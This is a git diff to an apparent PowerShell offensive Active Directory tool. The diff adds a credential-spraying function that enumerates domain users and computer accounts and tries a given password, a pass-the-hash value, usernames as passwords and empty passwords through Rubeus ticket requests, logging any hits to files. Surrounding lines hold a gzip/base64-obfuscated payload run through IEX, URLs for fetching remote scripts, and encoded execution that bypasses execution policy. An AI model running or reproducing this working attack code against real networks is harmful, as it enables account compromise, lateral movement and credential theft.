@@ -63,10 +63,21 @@ Param(
     [switch]$SessionHunter,
 
     [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
-    [String]$Ticket = ""
+    [String]$Ticket = "",
+
+    [Parameter(Mandatory=$False, Position=21, ValueFromPipeline=$true)]
+    [Switch]$Spray,
+
+    [Parameter(Mandatory=$False, Position=22, ValueFromPipeline=$true)]
+    [Switch]$AccountAsPassword,
+
+    [Parameter(Mandatory=$False, Position=23, ValueFromPipeline=$true)]
+    [Switch]$EmptyPassword
 )
 
-######### Banner #################################
+################################################################################################################
+###################################### Banner and version information ##########################################
+################################################################################################################
 
 $Banner = @("
   _____   _____ __  __          _____  ________   ________ _____ 
@@ -86,8 +97,10 @@ Write-Host "0.2.1"
 Write-Host
 
 
+################################################################################################################
+####################################### Some logic based checking ##############################################
+################################################################################################################
 
-IF($Method -eq "" -and $GenRelayList -eq "" -and $SessionHunter -eq ""){Write-Host "No Method Specified" -ForegroundColor "Red" ; break}
 IF($Method -eq "MSSQL" -and $Command -ne "" -and $SourceDomain -ne ""){Write-Host "Cross Domain MSSQL command execution not currently supported" -ForegroundColor "Red" ; break}
 
 if ($Threads -lt 2){
@@ -96,7 +109,7 @@ if ($Threads -lt 2){
         return
 }
 
-if ($Method -eq "" -and !$GenRelayList -and !$SessionHunter){
+if ($Method -eq "" -and !$GenRelayList -and !$SessionHunter -and !$Spray){
         Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
         Write-Host "No method specified"
         return
@@ -144,7 +157,10 @@ elseif ($CurrentUser -and $Method -ne "RDP"){
 # Check script modules
 $InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"
 
-###################### External Script Varibles ######################
+################################################################################################################
+######################################### External Script variables ############################################
+################################################################################################################
+
 $PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
 $KirbyURL =  "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
 
@@ -165,7 +181,10 @@ if (![string]::IsNullOrEmpty($LocalFileServer)) {
 }
 
 
-######### Sets up the PME directory if it does not exist #########
+################################################################################################################
+########################################### Initial Directory Setup ############################################
+################################################################################################################
+
 $WorkingDirectory = (Get-Item -Path ".\").FullName
 
 try {
@@ -191,6 +210,7 @@ $LSA = Join-Path $PME "LSA"
 $ConsoleHistory = Join-Path $PME "Console History"
 $Sessions = Join-Path "$PME" "Sessions"
 $UserFiles = Join-Path "$PME" "User Files"
+$Spraying = Join-Path $PME "Spraying"
 
   if (-not (Test-Path $PME)) {
     New-Item -ItemType Directory -Force -Path $PME  | Out-Null
@@ -269,12 +289,20 @@ $UserFiles = Join-Path "$PME" "User Files"
     Write-Host "Created directory for User Files at $UserFiles"
 }
 
+  if (-not (Test-Path $Spraying)){
+    New-Item -ItemType Directory -Force -Path $Spraying | Out-Null
+    Write-Host "[+] " -ForegroundColor "Green"   -NoNewline
+    Write-Host "Created directory for Spraying at $Spraying"
+}
+
 Write-Host ""
 
 ######### Checks if user context is administrative when a session is spawned #########
 $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-######### Target acquisition  Single Domain #########
+################################################################################################################
+########################################## Domain Target Acquisition ###########################################
+################################################################################################################
 
 if ($Targets -eq "Workstations") {
 
@@ -339,7 +367,19 @@ else {
     break
 }
 
-# Grab interesting users for various parsing functions
+################################################################################################################
+############################ Grab interesting users for various parsing functions ##############################
+################################################################################################################
+
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
+
+$searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+$users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
+$EnabledDomainUsers = $users | ForEach-Object {
+    $_.Properties["samAccountName"][0]
+}
 
 $DomainAdminGroupName = "Domain Admins"
 $directoryEntry = [ADSI]"LDAP://$domain"
@@ -402,6 +442,15 @@ $AccountOperators = $group.Properties["member"] | ForEach-Object {
     $user.Properties[$samAccountName][0]
 }
 
+# Grab Computer Accounts for spraying
+
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
+$ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
+
+
 if (!$LocalAuth){
 if ($Method -ne "RDP"){
 if (!$Force){
@@ -455,7 +504,10 @@ if (!$CurrentUser) {
 
 
 
-######### Load Rubeus #########
+################################################################################################################
+################################### Loads ticket functions into memory #########################################
+################################################################################################################
+
 if ($InvokeRubeusLoaded.Name -ne "Invoke-Rubeus"){
 function Invoke-Rubeus{
     [CmdletBinding()]
@@ -501,10 +553,9 @@ function Invoke-Rubeus{
     }
 }
 
-#Write-Host
-
-
-######### Grab a copy of the current users ticket so we can restore later #########
+################################################################################################################
+##################################### Ticket logic for authentication ##########################################
+################################################################################################################
 
 # Set the variable "CurrentUser" to $True if the switch -GenRelayList is used.
 if ($GenRelayList -or $SessionHunter) {
@@ -677,7 +728,9 @@ if (!$CurrentUser) {
     }
 }
 
-
+################################################################################################################
+################################## Information based on selected module ########################################
+################################################################################################################
 
 
 
@@ -774,6 +827,10 @@ elseif ($SessionHunter){
     Write-Host "Active sessions output will be written to $Sessions"
     #""
 }
+
+################################################################################################################
+######################################## Local scripts and modules #############################################
+################################################################################################################
 
 $ConsoleHostHistory = @'
 $usersFolderPath = "C:\Users"
@@ -996,7 +1053,11 @@ $Mongoose = @'
 Function Invoke-Mongoose{$gz="H4sIAAAAAAAEACVQ30vDMBB+F/wfQhhcytqydeqDPlXMRmHK3NrhFCHdzEYh7dSm4iz5373L+pDcfc33426ldB5lVumaCQZrGEK5BDZkDLKUbgFbI2/HiH8lEDCPdK/Y/lIXIOkt33zKd8EY78euHzkeTWEKIXxLoAf46o7hJ+iYaRv9lN+ZStX9XBIoYPyMaknhxeHvxZNYtC7nWMQ8VW2rZL01Jx7zmcxVvlELzYX3u3H9xJHrlesT8u6vHWfRXkBhK1Q1EISQQiggrbFtK+wFxI9lQ3MeNJ61ptrG/k9H5ZHQ0lbHhkBoib46tRZhXZ+HxlwHpe1eVdI8cEFzcHJPKMw5QEkq3hA+SCHDvqnslIwro71O6IdIfPyRn2Pi2biUFSUpLdEroj8dKeai2xq8vOoOV7wLaVuYppUqV7iyQlKaQd+oYm5cOOitWnbSseDy4h/XHGik6QEAAA=="
 $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::deCOmPreSs);$c=New-Object System.IO.MemoryStream;$b.COpYTo($c);$d=[System.Text.Encoding]::UTF8.GETSTrIng($c.ToArray());$b.ClOse();$a.ClosE();$c.cLose();$d|IEX}"";Invoke-Mongoose
 '@
-######### Module / Commands  #########
+
+
+################################################################################################################
+######################################## Command and Module logic ## ###########################################
+################################################################################################################
 
 # Tickets
 if ($Module -eq "Tickets"){
@@ -1081,13 +1142,17 @@ $Command = "powershell.exe -ep bypass -enc $base64Command"
 }
 
 
-# Gets the integer for the longest occurance of DNSHostName and Operating System. Ensures output is tidy
+################################################################################################################
+################################# Logic to help keep output tidy and even ######################################
+################################################################################################################
 
 $NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
 $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
 
 
-# Function - WMI
+################################################################################################################
+################################################ Function: WMI #################################################
+################################################################################################################
 Function Method-WMIexec {
 $ErrorActionPreference = "SilentlyContinue"
 Write-Host
@@ -1464,7 +1529,9 @@ elseif (!$osinfo){
     $WMIJobs | Remove-Job -Force -ErrorAction SilentlyContinue
 }
 
-# Function - PSexec
+################################################################################################################
+############################################## Function: PsExec ################################################
+################################################################################################################
 Function Method-Psexec {
 $ErrorActionPreference = "SilentlyContinue"
 Write-Host
@@ -1812,7 +1879,9 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
     $PSexecJobs | Remove-Job -Force -ErrorAction SilentlyContinue
 }
 
-# Function - WinRM
+################################################################################################################
+############################################### Function: WinRM ################################################
+################################################################################################################
 Function Method-WinRM {
 $ErrorActionPreference = "SilentlyContinue"
 Write-Host
@@ -2018,7 +2087,9 @@ Write-Host
     $WinRMJobs | Remove-Job -Force -ErrorAction SilentlyContinue
 }
 
-# Function - RDP
+################################################################################################################
+################################################# Function: RDP ################################################
+################################################################################################################
 Function Method-RDP {
 $ErrorActionPreference = "SilentlyContinue"
 Write-Host
@@ -2200,8 +2271,9 @@ $RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, 
     $RDPJobs | Remove-Job -Force -ErrorAction SilentlyContinue
 }
 
-# Function - SMB Signing
-# Function - GenRelayList
+################################################################################################################
+############################################# Function: GenRelayList ###########################################
+################################################################################################################
 Function GenRelayList {
     $ErrorActionPreference = "SilentlyContinue"
     Write-Host
@@ -3171,7 +3243,9 @@ if ($GenRelayList -and $Option -ne "Parse") {
     $SigningJobs | Remove-Job -Force -ErrorAction SilentlyContinue
 }
 
-
+################################################################################################################
+############################################ Function: SessionHunter ###########################################
+################################################################################################################
 Function SessionHunter {
     $MaxConcurrentJobs = $Threads
     Write-Host
@@ -3336,7 +3410,293 @@ Function SessionHunter {
     $SessionJobs | Remove-Job -Force -ErrorAction SilentlyContinue
 }
 
-# Function -  SAM
+################################################################################################################
+################################################## Function: Spray #############################################
+################################################################################################################
+Function Spray {
+
+# Logic for provided paramaters
+if ($Spray -and $Password -eq $null){Write-Host "Error"}
+if ($Spray -and $Hash -eq $null){}
+if ($Spray -and !$EmptyPassword){}
+
+            
+$domainPath = $directoryEntry.Path
+$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
+$searcher.PropertiesToLoad.AddRange(@("samAccountName", "badPwdCount"))
+    
+$lockoutObj = net accounts | Select-String threshold
+$lockoutStr = $lockoutObj.ToString()
+$lockoutStr -match '\d{1,3}' | Out-Null
+$lockoutStr -match 'Never' | Out-Null
+$LO_threshold = $matches[0]
+
+if ($LO_threshold -eq "Never") {
+    $SafeLimit = 100000
+} elseif ($LO_threshold -lt 3) {
+    Write-Host
+    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+    Write-Host "Lockout threshold is 2 or less. Aborting..."
+    return
+} elseif ($LO_threshold -lt 4) {
+    $SafeLimit = 1
+} else {
+    $SafeLimit = $LO_threshold - 2
+}
+
+
+
+# Display the $SafeLimit value
+Write-Output " - Lockout Threshold  : $LO_threshold"
+Write-Output " - Safety Limit value : $SafeLimit"
+Write-Output " - Removed disabled accounts from spraying"
+
+    
+    # Hash Spraying
+    if ($Hash -ne "") {
+    $Password = ""
+    $AccountAsPassword = $False
+        Write-Host
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Spraying with hash value: $Hash"
+        Write-Host
+
+        foreach ($UserToSpray in $EnabledDomainUsers) {
+
+    $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
+    $searchResult = $searcher.FindOne()
+        
+        $badPwdCount = $searchResult.Properties["badPwdCount"][0]
+            if ($badPwdCount -ge $SafeLimit){
+                if (!$SuccessOnly){
+                    Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
+                    Write-Host "$Domain\$UserToSpray - Safe threshold met"
+                    continue
+                    }
+            }
+
+            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash" | Out-String}
+            if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash" | Out-String}
+            
+            # Check for Unhandled Rubeus exception
+            if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
+                if (!$SuccessOnly){
+                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                    Write-Host "$Domain\$UserToSpray"
+         }    
+            } 
+            # Check for KDC_ERR_PREAUTH_FAILED
+            elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
+                if (!$SuccessOnly){
+                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                    Write-Host "$Domain\$UserToSpray"
+         }   
+            }
+            # Check for TGT request success
+            elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
+                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                Write-Host "$Domain\$UserToSpray"
+                "$Domain\${UserToSpray}:$Hash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
+                
+            }
+        }
+    }
+
+    # Password Spraying
+
+   if ($Password -ne ""){
+    $Hash = ""
+    $AccountAsPassword = $False
+        
+    Write-Host
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Spraying with password value: $Password"
+    Write-Host
+
+    foreach ($UserToSpray in $EnabledDomainUsers) {
+        $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
+        $searchResult = $searcher.FindOne()
+        
+        $badPwdCount = $searchResult.Properties["badPwdCount"][0]
+        
+        if ($badPwdCount -ge $SafeLimit){
+            if (!$SuccessOnly){
+                Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
+                Write-Host "$Domain\$UserToSpray - Safe threshold met"
+                continue
+     }   
+        }
+
+        # Generate a random delay between attempts
+		$Delay = Get-Random -Minimum 69 -Maximum 800
+		Start-Sleep -Milliseconds $Delay
+        
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$Password" | Out-String
+        
+        # Check for Unhandled Rubeus exception
+        if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
+            if (!$SuccessOnly){
+                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                Write-Host "$Domain\$UserToSpray"
+     }   
+        } 
+        
+        # Check for KDC_ERR_PREAUTH_FAILED
+        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
+            if (!$SuccessOnly){
+                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                Write-Host "$Domain\$UserToSpray"
+    }    
+        }
+        
+        # Check for TGT request success
+        elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+            "$Domain\${UserToSpray}:$Password" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
+        }
+    }
+}
+
+
+    # Account as password
+    if ($AccountAsPassword){
+    $Hash = ""
+    $Password = ""
+        
+    Write-Host
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Spraying usernames as passwords"
+    Write-Host
+
+    foreach ($UserToSpray in $EnabledDomainUsers) {
+        $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
+        $searchResult = $searcher.FindOne()
+        
+        $badPwdCount = $searchResult.Properties["badPwdCount"][0]
+        
+        if ($badPwdCount -ge $SafeLimit){
+            Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
+            Write-Host "$Domain\$UserToSpray - Safe threshold met"
+            continue
+        }
+
+        # Generate a random delay between attempts
+		$Delay = Get-Random -Minimum 69 -Maximum 800
+		Start-Sleep -Milliseconds $Delay
+        
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$UserToSpray" | Out-String
+        
+        # Check for Unhandled Rubeus exception
+        if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+        } 
+        # Check for KDC_ERR_PREAUTH_FAILED
+        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+        }
+        # Check for TGT request success
+        elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+            "$Domain\$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountsAsPassword-Users.txt" -Encoding "ASCII" -Append
+        }
+    }
+
+    Write-Host 
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Spraying Computer accounts as passwords"
+    Write-Host
+
+    foreach ($ComputerToSpray in $ComputerSamAccounts) {
+        $ComputerToSprayPassword = $ComputerToSpray -replace '\$', ''
+
+
+        # Generate a random delay between attempts
+		$Delay = Get-Random -Minimum 69 -Maximum 800
+		Start-Sleep -Milliseconds $Delay
+        
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$ComputerToSpray /password:$ComputerToSprayPassword" | Out-String
+
+        # Check for Unhandled Rubeus exception
+        if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "$Domain\$ComputerToSpray"
+        } 
+        # Check for KDC_ERR_PREAUTH_FAILED
+        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "$Domain\$ComputerToSpray"
+        }
+        # Check for TGT request success
+        elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "$Domain\$ComputerToSpray"
+            "$Domain\$ComputerToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountsAsPassword-Computers.txt" -Encoding "ASCII" -Append
+        }
+    }
+}
+
+
+    # EmptyPasswords
+    if ($EmptyPassword){
+    $Password = ""
+    $Hash = ""
+    $AccountAsPassword = $False
+    
+    Write-Host
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Spraying empty passwords"
+    Write-Host
+
+    foreach ($UserToSpray in $EnabledDomainUsers) {
+        $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
+        $searchResult = $searcher.FindOne()
+        
+        $badPwdCount = $searchResult.Properties["badPwdCount"][0]
+        
+        if ($badPwdCount -ge $SafeLimit){
+            Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
+            Write-Host "$Domain\$UserToSpray - Safe threshold met"
+            continue
+        }
+
+        # Generate a random delay between attempts
+		$Delay = Get-Random -Minimum 69 -Maximum 800
+		Start-Sleep -Milliseconds $Delay
+        
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:" | Out-String
+        
+        # Check for Unhandled Rubeus exception
+        if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+        } 
+        
+        # Check for KDC_ERR_PREAUTH_FAILED
+        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
+            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+            
+        }
+        
+        # Check for TGT request success
+        elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
+            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+            Write-Host "$Domain\$UserToSpray"
+            "$Domain\$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-EmptyPasswords.txt" -Encoding "ASCII" -Append
+        }
+    }
+}
+
+}
+
+
+################################################################################################################
+################################################## Function: SAM ###############################################
+################################################################################################################
 function SAM {
     if ($Module -eq "SAM" -and $Option -eq "Parse") {
         $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
@@ -3414,7 +3774,9 @@ function SAM {
     }
 }
 
-# Function - Parse-LogonPasswords
+################################################################################################################
+################################################# Function: Parse-LogonPassword ################################
+################################################################################################################
 Function Parse-LogonPasswords{
 if ($Module -eq "LogonPasswords" -and $Option -eq "Parse"){
 Write-Host
@@ -3501,7 +3863,9 @@ Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
     }
 }
 
-# Function - Parse-eKeys
+################################################################################################################
+################################################# Function: Parse-eKeys ########################################
+################################################################################################################
 Function Parse-eKeys {
 
 
@@ -3576,7 +3940,9 @@ Function Parse-eKeys {
     }
 }
 
-# Function - Restore Ticket
+################################################################################################################
+################################################# Function: RestoreTicket ######################################
+################################################################################################################
 Function RestoreTicket{
 if (!$CurrentUser) {
     if (!$GenRelayList){
@@ -3587,8 +3953,9 @@ if (!$CurrentUser) {
     }
 }
 
-
-########## Execute defined methods ##########
+################################################################################################################
+################################################ Execute defined functions #####################################
+################################################################################################################
 
 IF ($Method -eq "WinRM"){Method-WinRM}
 IF ($Method -eq "MSSQL"){Method-MSSQL}
@@ -3597,16 +3964,13 @@ IF ($Method -eq "WMI"){Method-WMIexec}
 IF ($Method -eq "RDP"){Method-RDP}
 IF ($GenRelayList){GenRelayList}
 IF ($SessionHunter){SessionHunter}
+IF ($Spray){Spray}
 
 SAM
 Parse-eKeys
 Parse-LogonPasswords
 RestoreTicket
-        
 
-########## Finish the script and write current time ##########
-# Add a function to also report the total time elapsed
- 
 Write-Host ""
 Write-Host ""
 $Time = (Get-Date).ToString("HH:mm:ss")
